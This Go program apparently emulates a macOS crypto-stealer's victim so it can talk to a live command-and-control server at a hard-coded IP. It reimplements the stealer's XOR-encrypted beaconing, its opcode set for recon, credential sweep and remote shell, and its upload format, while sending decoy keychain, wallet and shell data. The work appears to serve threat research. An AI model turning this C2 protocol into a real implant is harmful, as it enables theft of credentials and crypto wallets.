package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"embed"
	"encoding/binary"
	"fmt"
	"io"
	"log/slog"
	mathrand "math/rand/v2"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

//go:embed screenshot.jpg
var embedFS embed.FS

const (
	C2Host     = "46.30.191.141"
	DefaultTCPPort = 1337
	UserAgent  = "curl/8.4.0"
	IDFile     = ".victim_id"
	Marker     = 'K'
	Boundary   = "60ebe5b6-e8c2-4a2c-9037-647a50691f16"
	TCPSig     = 0x41765DDA
)

var Endpoints = []string{
	"http://46.30.191.141/index.php",
	"http://46.30.191.141/blaoners.php",
}

var OpcodeMap = map[string]string{
	"1": "FULL_RECON",
	"2": "SCREENSHOT",
	"3": "CREDENTIAL_SWEEP",
	"4": "FILE_SEARCH",
	"5": "EXEC_SHELL",
	"6": "TERMINATE",
}

const fakeExodusWallet = `{"mnemonic": "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about", "seed": "5eb00bbddcf069084889a8ab9155568165f5c453ccb85e70811aaed6f6da5fc19a5ac40b389cd370d086206dec8aa6c43daea6690f20ad3d8d48b2d2ce9e38e4"}`

type Emulator struct {
	UUID           string
	RawID          string
	Hostname       string
	User           string
	Log            *slog.Logger
	Client         *http.Client
	ActiveEndpoint int
	DetectedPort   int
	TCPFailCount   int
}

func NewEmulator() *Emulator {
	logger := slog.New(slog.NewJSONHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)
	id := loadUUID(logger)
	return &Emulator{
		UUID:     id,
		RawID:    strings.ToUpper(strings.ReplaceAll(id, "-", "")),
		Hostname: "Alexs-MacBook-Air.local",
		User:     "alex",
		Log:      logger,
		Client: &http.Client{
			Timeout: 300 * time.Second,
			Transport: &http.Transport{DisableCompression: true},
		},
		ActiveEndpoint: 0,
	}
}

func loadUUID(logger *slog.Logger) string {
	if data, err := os.ReadFile(IDFile); err == nil {
		return strings.TrimSpace(string(data))
	}
	id := fmt.Sprintf("%08X-%04X-4%03X-8%03X-%012X", mathrand.Uint32(), mathrand.Uint32()>>16, mathrand.Uint32()>>20, mathrand.Uint32()>>20, mathrand.Uint64()>>16)
	_ = os.WriteFile(IDFile, []byte(id), 0644)
	return id
}

func (e *Emulator) xor(data []byte) []byte {
	key := []byte(e.RawID)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func (e *Emulator) buildMultiplexedItem(name string, data []byte) []byte {
	buf := new(bytes.Buffer)
	buf.WriteString(Boundary)
	buf.WriteByte(0x01)
	binary.Write(buf, binary.LittleEndian, uint32(len(data)))
	binary.Write(buf, binary.LittleEndian, uint32(len(name)+1))
	buf.WriteString(name)
	buf.WriteByte(0x00)
	buf.Write(data)
	return buf.Bytes()
}

func (e *Emulator) rotateEndpoint(reason string) {
	e.ActiveEndpoint = (e.ActiveEndpoint + 1) % len(Endpoints)
	e.TCPFailCount = 0
	e.Log.Warn("ENDPOINT_ROTATED", "new_target", Endpoints[e.ActiveEndpoint], "reason", reason)
}

func (e *Emulator) postHTTP(payload []byte, label string) bool {
	time.Sleep(300 * time.Millisecond) // Behavioral delay
	url := Endpoints[e.ActiveEndpoint]
	e.Log.Info("http_post_start", "stage", label, "url", url, "payload_len", len(payload))
	
	encrypted := e.xor(payload)
	packet := make([]byte, 33+len(encrypted))
	copy(packet[0:32], []byte(e.RawID))
	packet[32] = Marker
	copy(packet[33:], encrypted)

	req, _ := http.NewRequestWithContext(context.Background(), "POST", url, bytes.NewBuffer(packet))
	req.Header = make(http.Header)
	req.Header["Host"] = []string{C2Host}
	req.Header["User-Agent"] = []string{UserAgent}
	req.Header["Accept"] = []string{"*/*"}
	req.Header["Content-Type"] = []string{"application/octet-stream"}
	req.Header["Expect"] = []string{"100-continue"}
	req.Header["Connection"] = []string{"Keep-Alive"}

	resp, err := e.Client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		e.Log.Error("http_failed", "stage", label, "err", err)
		e.rotateEndpoint("HTTP_FAILURE")
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	e.Log.Info("http_response", "stage", label, "code", resp.StatusCode, "body_len", len(body))

	if len(body) == 0 {
		e.Log.Warn("server_returned_empty_body", "stage", label)
		e.rotateEndpoint("EMPTY_BODY_REJECTION")
		return false
	}

	if len(body) > 0 {
		decrypted := string(e.xor(body))
		e.Log.Debug("c2_response_decrypted", "body", decrypted)

		tokens := strings.Split(decrypted, "|")
		if len(tokens) >= 2 && tokens[0] == "START" {
			port, err := strconv.Atoi(tokens[1])
			if err == nil {
				e.DetectedPort = port
				e.Log.Warn("C2_ACTIVATION_SIGNAL_RECEIVED", "target_port", port)
				return true
			}
		}
	}
	return true
}

func (e *Emulator) handleShell(command string) string {
	cmd := strings.TrimSpace(command)
	e.Log.Warn("REMOTE_SHELL_EXEC", "cmd", cmd)
	time.Sleep(time.Duration(250+mathrand.IntN(200)) * time.Millisecond)

	responses := map[string]string{
		"whoami":     e.User,
		"id":         "uid=501(alex) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),80(admin)",
		"hostname":   e.Hostname,
		"pwd":        "/Users/" + e.User,
		"sw_vers":    "ProductName:\tmacOS\nProductVersion:\t14.2.1\nBuildVersion:\t23C71",
		"uname -a":   "Darwin Alexs-MacBook-Air.local 23.2.0 Darwin Kernel Version 23.2.0: Wed Nov 15 21:28:27 PST 2023; root:xnu-10002.61.3~2/RELEASE_ARM64_T8103 arm64",
		"uptime":     "14:20  up 3 days, 22:14, 2 users, load averages: 2.14 1.98 2.05",
		"env":        "USER=alex\nLOGNAME=alex\nHOME=/Users/alex\nSHELL=/bin/zsh",
		"ls -la ~/":  "total 0\ndrwxr-xr-x  + 65 alex  staff   2080 Feb 14 12:00 .\ndrwxr-xr-x    6 root  admin    192 Dec 10 10:05 ..\n-rw-r--r--@   1 alex  staff   6148 Feb 14 12:05 .DS_Store\ndrwx------   12 alex  staff    384 Feb 14 12:10 Desktop\ndrwx------   25 alex  staff    800 Feb 14 12:15 Documents\ndrwx------   40 alex  staff   1280 Feb 14 12:20 Library",
		"ls -la ~/Desktop":   "total 16\ndrwx------   12 alex  staff   384 Feb 14 12:10 .\n-rw-r--r--@   1 alex  staff  1024 Feb 14 12:05 .DS_Store\n-rw-------    1 alex  staff  5120 Feb 14 09:15 wallet_recovery.pdf",
		"ls -la ~/Documents": "total 8\ndrwx------   25 alex  staff   800 Feb 14 12:15 .\n-rw-r--r--    1 alex  staff  1024 Feb 10 09:00 recovery_seed.txt\n-rw-r--r--    1 alex  staff  4096 Jan 08 11:15 passwords.docx",
		"ls /Applications":   "Safari.app\nMail.app\nChrome.app\nExodus.app\nLedger Live.app\nTelegram.app\nSlack.app",
		"ifconfig":           "lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384\n\tinet 127.0.0.1 netmask 0xff000000 \nen0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n\tinet 192.168.1.42 netmask 0xffffff00 broadcast 192.168.1.255\n\tether a8:66:7f:12:34:56\n\tstatus: active",
		"system_profiler SPHardwareDataType": "Hardware Overview:\n\n      Model Name: MacBook Air\n      Model Identifier: MacBookAir10,1\n      Chip: Apple M1\n      Memory: 16 GB\n      Hardware UUID: " + e.UUID,
		"cat ~/.zsh_history":                 ": 1707912000:0;brew update\n: 1707912060:0;ls -la\n: 1707912180:0;open -a Exodus.app\n: 1707912240:0;git commit -m \"fix bug\"",
		"ls -la ~/Library/Keychains":         "total 4096\n-rw-------   1 alex  staff  524288 Feb 14 12:00 login.keychain-db",
		"groups":                             "staff everyone localaccounts admin com.apple.sharepoint.group.1 _appstore _lpadmin _lpoperator _developer _analyticsusers",
		"arch":                               "arm64",
		"csrutil status":                     "System Integrity Protection status: enabled.",
		"spctl --status":                     "assessments enabled",
		"date":                               time.Now().Format("Mon Jan 2 15:04:05 MST 2006"),
		"df -h":                              "Filesystem       Size   Used  Avail Capacity iused      ifree %iused  Mounted on\n/dev/disk3s1s1  460Gi  9.8Gi  250Gi     4%  356821 4881967214    0%   /\n/dev/disk3s2    460Gi  197Gi  250Gi    45% 1024837 4881299198    0%   /System/Volumes/Data",
		"dscl . -list /Users":                "_amavisd\n_appleevents\n_applepay\n_appstore\n_ard\nalex\ndaemon\nnobody\nroot",
		"ls -la ~/Library/Application\\ Support/Exodus/": "total 0\ndrwxr-xr-x   3 alex  staff    96 Feb 14 12:00 .\ndrwxr-xr-x   5 alex  staff   160 Feb 14 12:00 ..\ndrwxr-xr-x   8 alex  staff   256 Feb 14 12:00 exodus.wallet",
		"system_profiler SPSoftwareDataType": "Software:\n\n    System Software Overview:\n\n      System Version: macOS 14.2.1 (23C71)\n      Kernel Version: Darwin 23.2.0\n      Boot Volume: Macintosh HD\n      Boot Mode: Normal\n      Secure Virtual Memory: Enabled",
	}

	if val, ok := responses[cmd]; ok { return val }

	if strings.Contains(cmd, "pgrep") {
		return ""
	}
	if strings.Contains(cmd, "find") && (strings.Contains(cmd, "wallet") || strings.Contains(cmd, "exodus")) {
		return "/Users/" + e.User + "/Library/Application Support/Exodus/exodus.wallet"
	}

	return ".DS_Store\nDesktop\nDocuments\nDownloads\nLibrary"
}

func (e *Emulator) runTCPChannel() {
	port := e.DetectedPort
	if port == 0 {
		port = DefaultTCPPort
		e.Log.Info("tcp_command_channel_init", "port", port, "source", "default")
	} else {
		e.Log.Info("tcp_command_channel_init", "port", port, "source", "c2_signal")
	}

	for {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", C2Host, port), 10*time.Second)
		if err != nil {
			e.Log.Debug("tcp_dial_failed", "err", err)
			e.TCPFailCount++
			if e.TCPFailCount >= 3 {
				e.rotateEndpoint("TCP_3_STRIKES")
			}
			time.Sleep(30 * time.Second)
			continue
		}

		e.TCPFailCount = 0
		e.Log.Info("tcp_established", "remote", conn.RemoteAddr().String())
		binary.Write(conn, binary.BigEndian, uint32(TCPSig))

		for {
			heartbeat := fmt.Sprintf("ID: %s | STATUS: IDLE", e.RawID)
			payload := e.xor([]byte(heartbeat))
			e.Log.Info("tcp_heartbeat_send", "plaintext", heartbeat)

			if err := binary.Write(conn, binary.LittleEndian, uint32(len(payload))); err != nil { break }
			if _, err := conn.Write(payload); err != nil { break }

			var cmdLen uint32
			conn.SetReadDeadline(time.Now().Add(75 * time.Second))
			if err := binary.Read(conn, binary.LittleEndian, &cmdLen); err != nil { break }

			cmdBuf := make([]byte, cmdLen)
			if _, err := io.ReadFull(conn, cmdBuf); err != nil { break }

			decrypted := string(e.xor(cmdBuf))
			e.Log.Warn("TCP_COMMAND_RECEIVED", "raw", decrypted)

			parts := strings.Split(decrypted, "|")
			opcode := parts[0]
			cmdName := OpcodeMap[opcode]

			e.postHTTP([]byte(fmt.Sprintf("ACK: Starting %s", cmdName)), "behavioral_ack")

			var result []byte
			switch cmdName {
			case "EXEC_SHELL":
				if len(parts) > 1 { result = []byte(e.handleShell(parts[1])) }
			case "SCREENSHOT":
				e.Log.Warn("SCREENSHOT_TASK_ACTIVE")
				img, _ := embedFS.ReadFile("screenshot.jpg")
				entropy := make([]byte, 16)
				rand.Read(entropy)
				result = e.buildMultiplexedItem("screenshot.jpg", append(img, entropy...))
			case "CREDENTIAL_SWEEP":
				e.Log.Warn("CREDENTIAL_SWEEP_TASK_ACTIVE")
				keychainSize := 1024 + mathrand.IntN(1024)
				result = e.buildMultiplexedItem("login.keychain-db", make([]byte, keychainSize))
				result = append(result, e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))...)
			case "FULL_RECON":
				e.Log.Warn("FULL_RECON_TASK_ACTIVE")
				recon := fmt.Sprintf(`UUID: %s
Hardware UUID: %s
macOS Password: password123
Hostname: %s
Username: %s
Model: MacBookAir10,1
Chip: Apple M1
Memory: 16 GB
System Version: macOS 14.2.1 (23C71)
Kernel: Darwin 23.2.0
SIP: enabled
Gatekeeper: enabled
Architecture: arm64
Users: alex, _appstore, daemon, root
`, e.UUID, e.UUID, e.Hostname, e.User)
				result = e.buildMultiplexedItem("full_recon.txt", []byte(recon))
			case "FILE_SEARCH":
				pattern := ""
				if len(parts) > 1 {
					pattern = parts[1]
				}
				e.Log.Warn("FILE_SEARCH_TASK_ACTIVE", "pattern", pattern)
				findings := fmt.Sprintf(`Search results for: %s
/Users/alex/Library/Application Support/Exodus/exodus.wallet
/Users/alex/Documents/recovery_seed.txt
/Users/alex/Desktop/wallet_recovery.pdf
/Users/alex/.ssh/id_rsa
`, pattern)
				result = e.buildMultiplexedItem("search_results.txt", []byte(findings))
			case "TERMINATE":
				e.Log.Warn("TERMINATE_RECEIVED")
				e.postHTTP([]byte("Client terminating"), "shutdown_notice")
				os.Exit(0)
			}

			if len(result) > 0 { e.postHTTP(result, "command_result_exfil") }
			time.Sleep(10 * time.Second)
		}
		conn.Close()
		time.Sleep(30 * time.Second)
	}
}

func main() {
	e := NewEmulator()
	e.Log.Info("brew_poker_online", "victim_id", e.RawID)

	heavyRecon := fmt.Sprintf(`UUID: %s
macOS Password: password123
Hostname: %s
Username: %s
Model Name: MacBook Air
Model Identifier: MacBookAir10,1
Chip: Apple M1
Memory: 16 GB
Hardware UUID: %s
System Version: macOS 14.2.1 (23C71)
`, e.UUID, e.Hostname, e.User, e.UUID)

	reconItem := e.buildMultiplexedItem("recon.txt", []byte(heavyRecon))

	for !e.postHTTP(reconItem, "init_recon") {
		e.Log.Info("retrying_registration_on_fallback")
		time.Sleep(2 * time.Second)
	}

	time.Sleep(1 * time.Second)

	fakeKeychain := make([]byte, 512*1024)
	rand.Read(fakeKeychain)
	loot := e.buildMultiplexedItem("login.keychain-db", fakeKeychain)
	loot = append(loot, e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))...)

	for !e.postHTTP(loot, "init_loot") {
		e.Log.Info("retrying_loot_on_fallback")
		time.Sleep(2 * time.Second)
	}

	// Try once more to see if C2 sent port activation signal, otherwise use default
	e.runTCPChannel()
}
